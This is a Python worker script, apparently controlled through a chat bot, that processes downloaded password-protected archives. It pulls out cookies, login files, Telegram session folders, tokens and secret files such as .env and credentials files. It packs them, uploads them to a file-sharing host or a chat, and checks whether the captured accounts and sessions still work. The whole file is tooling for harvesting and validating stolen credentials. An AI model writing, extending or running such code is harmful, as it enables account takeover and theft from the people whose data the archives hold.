            return (f"{gold_header('SECRET FILES', esc('%d found' % sec_total))}\n{THIN}\n"
                    f"🗝 {bold('Files')}    {code(sec_total)} secret files\n"
                    + ship_note(idx, count, size, tot, split, "secrets.zip"))
        sec_parts, sec_link = ship(sec_zip, sec_cap)
        if sec_link:
            links["secrets"] = sec_link

    ck = check_auths(auths) if (task.get("authcheck") and auths) else {}
    shutil.rmtree(WORK, ignore_errors=True)
    st("done", 100, job=task.get("job"), vm=SPECS)
    finish(task, "done", found=packed, cookies=sum(packed.values()), sent=sent,
           failed=failed, links=links, auth=len(auths) if task.get("auth") else 0,
           td_total=0, td_parts=0, td_via=None,
           tok_total=tok_total, tok_parts=tok_parts,
           js_total=js_total, js_parts=js_parts,
           sec_total=sec_total, sec_parts=sec_parts, files=len(paths),
           bytes=total_bytes, mode=task.get("mode"), **ck)


def process_batch(task):
    """One operation over every file of the batch."""
    global CHAT
    mode = task.get("mode") or "vps_promox"
    CHAT = task.get("chat")
    PB[0], PB[2], PB[3] = 0.0, time.time(), 0
    PB[1] = task.get("msg")
    (OUT / "cancel.flag").unlink(missing_ok=True)

    files = task.get("files") or []
    st("queued", 0, job=task.get("job"), vm=SPECS, kind="batch", mode=mode)
    if not files:
        finish(task, "error", err="the batch carried no files")
        return

    paths, total_bytes, errors = batch_download(files)
    if stop():
        finish(task, "cancelled", err="cancelled")
        return
    if not paths:
        detail = "; ".join("%s: %s" % (files[k].get("name") or k, v)
                           for k, v in list(errors.items())[:3])
        finish(task, "error", err="every file failed to download"
               + (" (%s)" % detail if detail else ""))
        return

    if mode == "vps_promox":
        batch_panels(task, paths, virtl=False, total_bytes=total_bytes)
    elif mode == "vps_virtl":
        batch_panels(task, paths, virtl=True, total_bytes=total_bytes)
    elif mode == "extract":
        batch_extract(task, paths, total_bytes=total_bytes)
    else:
        finish(task, "error", err="unknown batch mode %r" % mode)


def process(task):
    """Run one job inside this long-lived VM."""
    global DOMS, CHAT
    DOMS = [d.lower() for d in task.get("domains") or []]
    CHAT = task.get("chat")
    PB[0], PB[2], PB[3] = 0.0, time.time(), 0
    PB[1] = task.get("msg")
    for junk in list(OUT.glob("*.zip")) + [PROG]:
        try: junk.unlink()
        except Exception: pass
    (OUT / "cancel.flag").unlink(missing_ok=True)
    st("queued", 0, job=task.get("job"), vm=SPECS)
    arc = download(task["url"])
    if arc is None:
        why = _state.get("err") or "aborted"
        if stop():
            finish(task, "cancelled", err="cancelled")
        else:
            finish(task, "error", err=why)
        return
    ok, why = extract(arc, WORK / "ex", task.get("passwords") or [])
    if stop():
        finish(task, "cancelled", err="cancelled"); return
    if not ok:
        tried = len(task.get("passwords") or [])
        if why == "wrong_password":
            finish(task, "wrong_password", tried=tried)
        else:
            finish(task, "error", err=why)
        return
    # keep dl/ for the whole run: the json / secrets / tdata passes all need
    # the archive on disk, WORK is wiped at the end anyway.
    packed, auths = search_pack(WORK / "ex", bool(task.get("auth")))
    if stop():
        shutil.rmtree(WORK, ignore_errors=True)
        finish(task, "cancelled", err="cancelled"); return
    sent, failed, links = deliver(packed, task)
    want_auth = bool(task.get("auth"))
    want_tdata = bool(task.get("tdata"))
    auth_sent, auth_fid = deliver_auth(auths) if want_auth else (False, None)
    td_zip, td_total = None, 0
    if want_tdata:
        tdirs = find_tdata(WORK / "ex")
        if not tdirs:
            # the filtered extract skips tdata binaries — pull them now
            st("extract", 45, msg="tdata not in filtered extract — pulling")
            try:
                _extract(arc, WORK / "tdex", task.get("passwords") or [],
                         ["*tdata*"])
            except Exception as e:
                sys.stdout.write("tdex pass: %s\n" % e); sys.stdout.flush()
            tdirs = find_tdata(WORK / "ex") + find_tdata(WORK / "tdex")
        if not tdirs:
            st("extract", 45, msg="full extract to hunt tdata folders")
            try:
                _extract(arc, WORK / "tdfull", task.get("passwords") or [], None)
            except Exception as e:
                sys.stdout.write("tdfull pass: %s\n" % e); sys.stdout.flush()
            tdirs = find_tdata(WORK / "tdfull")
        if not tdirs:
            tdirs = find_tdata(WORK / "ex")   # final sweep, signature rules too
        td_zip, td_total = pack_tdata(tdirs)
    td_parts, td_link, td_via = 0, None, None
    if td_zip:
        td_size = td_zip.stat().st_size
        td_sub = esc('%d folder%s found' % (td_total, '' if td_total == 1 else 's'))
        td_head = (f"{gold_header('TDATA FOUND', td_sub)}\n{THIN}\n"
                   f"🗃 {bold('Folders')}  {code(td_total)}\n"
                   f"📦 {bold('Size')}     {code(fs(td_size))}\n")
        td_tail = (f"🗂 {bold('Layout')}    plain folder trees inside the zip — "
                   f"no zip-in-zip, unzip and use\n"
                   f"🗝 {bold('Manifest')}  found_in.txt shows each origin path\n"
                   f"📎 Sessions, map0/map1 and key files all included.")
        td_link = gofile(str(td_zip))
        if td_link:
            td_parts, td_via = 1, "link"
            new_card(td_head + f"🔓 {bold('Download')} {code(td_link)}\n"
                              f"🌐 {bold('Note')}      one zip, whole tdata set — "
                              f"link works for anyone, not just you\n" + td_tail)
        else:
            # gofile is down — the archive is still worth delivering, so fall back
            # to the chat copy instead of losing the run's tdata work.
            sys.stdout.write("gofile failed for tdata.zip — sending it to chat\n")
            sys.stdout.flush()
            def td_cap(size, idx, count, tot, split):
                return td_head + ship_note(idx, count, size, tot, split, "tdata.zip") + td_tail
            td_parts, td_link = ship(td_zip, td_cap)
            td_via = "chat"
        if td_link:
            links["tdata"] = td_link
    tk = {}
    if want_tdata and task.get("tdatacheck") and tdirs:
        st("queued", 89, job=task.get("job"), vm=SPECS,
           msg="tdata proxy-check starting")
        try:
            tk = check_tdata(tdirs)
        except Exception as e:
            sys.stdout.write("tdcheck crashed: %s\n" % e); sys.stdout.flush()
            tk = {"tk_total": len(tdirs), "tk_valid": 0, "tk_prem": 0,
                  "tk_2fa": 0, "tk_frozen": 0, "tk_dead": 0, "tk_err": len(tdirs),
                  "tk_proxies": 0, "tk_zip": False}
    tok_zip, tok_total = None, 0
    toks = find_tokens([WORK / "ex", WORK / "tdex", WORK / "tdfull"])
    if toks:
        tok_zip, tok_total = pack_tokens(toks)
    tok_parts, tok_link = 0, None
    if tok_zip:
        def tok_cap(size, idx, count, tot, split):
            return (f"{gold_header('TOKEN FILES', esc('%d found' % tok_total))}\n{THIN}\n"
                    f"🎟 {bold('Files')}    {code(tok_total)} × {code('tokens.txt')}\n"
                    f"🏷 {bold('Names')}    {code('<folder it came from>_file_token.txt')}\n"
                    + ship_note(idx, count, size, tot, split, "tokens.zip") +
                    f"🗝 {bold('Manifest')}  found_in.txt shows each origin path")
        tok_parts, tok_link = ship(tok_zip, tok_cap)
        if tok_link:
            links["tokens"] = tok_link
    js_zip, js_total = None, 0
    if task.get("json"):
        st("scan", 44, msg="hunting every .json in the archive")
        jsf = find_json([WORK / "ex", WORK / "tdex", WORK / "tdfull"])
        sys.stdout.write("json hunt 1st pass: %d files\n" % len(jsf))
        sys.stdout.flush()
        if not jsf:
            # the filtered extract only keeps .txt/.log/.cookie/auth.json —
            # pull all the other .json files now; on nested archives the
            # include-mask pass often matches nothing, so a full pass follows
            st("extract", 45, msg="pulling every .json from the archive")
            ok, why = False, "pass_skipped"
            try:
                ok, why = _extract(arc, WORK / "jx",
                                   task.get("passwords") or [], ["*.json"])
                sys.stdout.write("jx incl pass: ok=%s why=%s\n" % (ok, why))
            except Exception as e:
                sys.stdout.write("jx incl pass: %s\n" % e)
            sys.stdout.flush()
            jsf = find_json([WORK / "jx"])
            if not jsf:
                st("extract", 45, msg="full extract to gather every .json")
                try:
                    ok, why = _extract(arc, WORK / "jx",
                                       task.get("passwords") or [], None)
                    sys.stdout.write("jx full pass: ok=%s why=%s\n" % (ok, why))
                except Exception as e:
                    sys.stdout.write("jx full pass: %s\n" % e)
                sys.stdout.flush()
                jsf = find_json([WORK / "jx"])
            sys.stdout.write("json hunt total: %d files\n" % len(jsf))
            sys.stdout.flush()
        js_zip, js_total = pack_json(jsf)
    js_parts, js_link = 0, None
    if js_zip:
        def js_cap(size, idx, count, tot, split):
            return (f"{gold_header('JSON FILES', esc('%d found' % js_total))}\n{THIN}\n"
                    f"🗂 {bold('Files')}    {code(js_total)} × {code('.json')}\n"
                    f"🏷 {bold('Names')}    original names — duplicates become "
                    f"{code('name_#1.json')}, {code('name_#2.json')}\n"
                    + ship_note(idx, count, size, tot, split, "json_files.zip") +
                    f"🗝 {bold('Manifest')}  found_in.txt shows each origin path")
        js_parts, js_link = ship(js_zip, js_cap)
        if js_link:
            links["json"] = js_link
    # ── secret files — automatic, like tokens.txt ──
    secf = find_secrets([WORK / "ex", WORK / "tdex", WORK / "tdfull"])
    if not secf:
        st("extract", 45, msg="pulling secret files from the archive")
        try:
            _extract(arc, WORK / "sx", task.get("passwords") or [],
                     SECRET_FILTERS)
        except Exception as e:
            sys.stdout.write("sx pass: %s\n" % e)
        sys.stdout.flush()
        secf = find_secrets([WORK / "sx"])
        if not secf:
            st("extract", 45, msg="full extract to hunt every secret file")
            try:
                _extract(arc, WORK / "sx", task.get("passwords") or [], None)
            except Exception as e:
                sys.stdout.write("sx full pass: %s\n" % e)
            sys.stdout.flush()
            secf = find_secrets([WORK / "sx"])
    sys.stdout.write("secret hunt: %d files\n" % len(secf)); sys.stdout.flush()
    sec_zip, sec_total = pack_secrets(secf)
    sec_parts, sec_link = 0, None
    if sec_zip:
        def sec_cap(size, idx, count, tot, split):
            return (f"{gold_header('SECRET FILES', esc('%d found' % sec_total))}"
                    f"\n{THIN}\n"
                    f"🗝 {bold('Files')}    {code(sec_total)} secret files\n"
                    f"🏷 {bold('Layout')}   one folder per type — {code('env/')}, "
                    f"{code('credentials_json/')}, {code('secrets_json/')}…\n"
                    + ship_note(idx, count, size, tot, split, "secrets.zip") +
                    f"🗝 {bold('Manifest')}  found_in.txt shows each origin path")
        sec_parts, sec_link = ship(sec_zip, sec_cap)
        if sec_link:
            links["secrets"] = sec_link
    ck = check_auths(auths) if (want_auth and task.get("authcheck") and auths) else {}
    shutil.rmtree(WORK, ignore_errors=True)
    st("done", 100, job=task.get("job"), vm=SPECS)
    finish(task, "done", found=packed, cookies=sum(packed.values()), sent=sent,
           failed=failed, links=links, auth=len(auths) if want_auth else 0,
           auth_sent=auth_sent, auth_fid=auth_fid if want_auth else None,
           td_total=td_total, td_parts=td_parts, td_via=td_via,
           tok_total=tok_total, tok_parts=tok_parts,
           js_total=js_total, js_parts=js_parts,
           sec_total=sec_total, sec_parts=sec_parts, **tk, **ck)

def main():
    OUT.mkdir(parents=True, exist_ok=True)
    global SPECS
    SPECS = vm_specs()
    # The task may arrive encrypted (the bot seals it with the
    # RUNNER_TASK_KEY, the workflow opens it with the repository secret of the
    # same name). _TASK_ is the unsealed version.
    task = dict(_TASK_) if _TASK_ else {}
    if task.get("url") and task.get("fallback_url"):
        task["url"] = prefer_direct(task.get("url"), task.get("fallback_url"))
    if task.get("kind") in ("vps_promox", "vps_check", "vps_virtl", "vps_verify"):
        process_vps(task)
        return
    if task.get("kind") == "batch":
        process_batch(task)
        return
    if not task.get("url"):
        st("error", err="runner started without a task")
        report({"event": "no_task"})
        return
    st("queued", 0, job=task.get("job"), vm=SPECS)
    process(task)

if __name__ == "__main__":
    main()
